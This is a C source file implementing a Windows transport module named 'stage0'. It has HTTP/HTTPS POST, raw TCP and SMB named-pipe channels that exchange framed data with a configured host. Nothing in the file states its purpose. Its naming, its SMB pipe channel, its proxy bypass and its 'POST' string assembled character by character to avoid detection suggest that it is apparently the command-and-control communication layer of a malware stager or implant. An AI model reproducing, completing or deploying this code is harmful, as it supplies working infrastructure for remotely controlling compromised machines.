#include "stage0.h"
#include <winhttp.h>
#include <ws2tcpip.h>

typedef struct { HINTERNET session, connection; s0_config cfg; } http_state;
typedef struct { SOCKET socket; HANDLE pipe; s0_config cfg; } stream_state;

static int http_open(s0_transport *t, const s0_config *cfg) {
    http_state *s = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*s));
    if (!s) return 0;
    s->cfg = *cfg;
    s->session = WinHttpOpen(0, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, 0, 0);
    if (s->session)
        s->connection = WinHttpConnect(s->session, cfg->host, cfg->port, 0);
    if (!s->connection) {
        if (s->session) WinHttpCloseHandle(s->session);
        HeapFree(GetProcessHeap(), 0, s); return 0;
    }
    t->state = s; return 1;
}

static int http_exchange(s0_transport *t, const uint8_t *in, uint32_t in_len,
                         s0_buffer *out) {
    http_state *s = t->state; HINTERNET r; DWORD got, avail;
    DWORD flags = s->cfg.secure ? WINHTTP_FLAG_SECURE : 0;
    static const wchar_t method[] = {L'P',L'O',L'S',L'T',0};
    r = WinHttpOpenRequest(s->connection, method, s->cfg.path, 0, 0, 0, flags);
    if (!r) return 0;
    if (!WinHttpSendRequest(r, 0, 0, (void *)in, in_len, in_len, 0) ||
        !WinHttpReceiveResponse(r, 0)) { WinHttpCloseHandle(r); return 0; }
    while (WinHttpQueryDataAvailable(r, &avail) && avail) {
        if (!s0_buffer_reserve(out, out->length + avail) ||
            !WinHttpReadData(r, out->data + out->length, avail, &got)) break;
        out->length += got;
    }
    WinHttpCloseHandle(r); return out->length != 0;
}

static void http_close(s0_transport *t) {
    http_state *s = t->state; if (!s) return;
    if (s->connection) WinHttpCloseHandle(s->connection);
    if (s->session) WinHttpCloseHandle(s->session);
    HeapFree(GetProcessHeap(), 0, s); t->state = 0;
}

static int stream_open(s0_transport *t, const s0_config *cfg) {
    stream_state *s = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*s));
    WSADATA w; struct sockaddr_in a;
    if (!s) return 0; s->cfg = *cfg; s->socket = INVALID_SOCKET;
    if (cfg->kind == S0_T_SMB) {
        s->pipe = CreateFileW(cfg->path, GENERIC_READ | GENERIC_WRITE, 0, 0,
                              OPEN_EXISTING, 0, 0);
        if (s->pipe == INVALID_HANDLE_VALUE) { HeapFree(GetProcessHeap(),0,s); return 0; }
    } else {
        WSAStartup(MAKEWORD(2,2), &w); s->socket = socket(AF_INET, SOCK_STREAM, 0);
        a.sin_family = AF_INET; a.sin_port = htons(cfg->port);
        if (InetPtonW(AF_INET, cfg->host, &a.sin_addr) != 1 ||
            connect(s->socket, (struct sockaddr *)&a, sizeof(a))) {
            closesocket(s->socket); WSACleanup(); HeapFree(GetProcessHeap(),0,s); return 0;
        }
    }
    t->state = s; return 1;
}

static int stream_exchange(s0_transport *t, const uint8_t *in, uint32_t in_len,
                           s0_buffer *out) {
    stream_state *s = t->state; DWORD n = 0, off = 0; int r;
    s0_frame_header h;
    if (s->cfg.kind == S0_T_SMB) {
        if (!WriteFile(s->pipe, in, in_len, &n, 0) ||
            n != in_len ||
            !ReadFile(s->pipe, &h, sizeof(h), &n, 0) || n != sizeof(h) ||
            h.magic != S0_MAGIC || h.length > S0_MAX_FRAME - sizeof(h) ||
            !s0_buffer_reserve(out, sizeof(h) + h.length)) return 0;
        CopyMemory(out->data, &h, sizeof(h)); off = sizeof(h);
        while (off < sizeof(h) + h.length) {
            if (!ReadFile(s->pipe, out->data + off,
                          sizeof(h) + h.length - off, &n, 0) || !n) return 0;
            off += n;
        }
        out->length = off; return 1;
    }
    while (off < in_len) {
        r = send(s->socket, (const char *)in + off, in_len - off, 0);
        if (r <= 0) return 0; off += (uint32_t)r;
    }
    off = 0;
    while (off < sizeof(h)) {
        r = recv(s->socket, (char *)&h + off, sizeof(h) - off, 0);
        if (r <= 0) return 0; off += (uint32_t)r;
    }
    if (h.magic != S0_MAGIC || h.length > S0_MAX_FRAME - sizeof(h) ||
        !s0_buffer_reserve(out, sizeof(h) + h.length)) return 0;
    CopyMemory(out->data, &h, sizeof(h)); off = sizeof(h);
    while (off < sizeof(h) + h.length) {
        r = recv(s->socket, (char *)out->data + off,
                 sizeof(h) + h.length - off, 0);
        if (r <= 0) return 0; off += (uint32_t)r;
    }
    out->length = off; return 1;
}

static void stream_close(s0_transport *t) {
    stream_state *s = t->state; if (!s) return;
    if (s->cfg.kind == S0_T_SMB) CloseHandle(s->pipe);
    else { closesocket(s->socket); WSACleanup(); }
    HeapFree(GetProcessHeap(), 0, s); t->state = 0;
}

int s0_transport_init(s0_transport *t, s0_transport_kind kind) {
    if (!t) return 0; ZeroMemory(t, sizeof(*t));
    if (kind == S0_T_HTTP || kind == S0_T_HTTPS) {
        t->open = http_open; t->exchange = http_exchange; t->close = http_close;
    } else if (kind == S0_T_TCP || kind == S0_T_SMB) {
        t->open = stream_open; t->exchange = stream_exchange; t->close = stream_close;
    } else return 0;
    return 1;
}
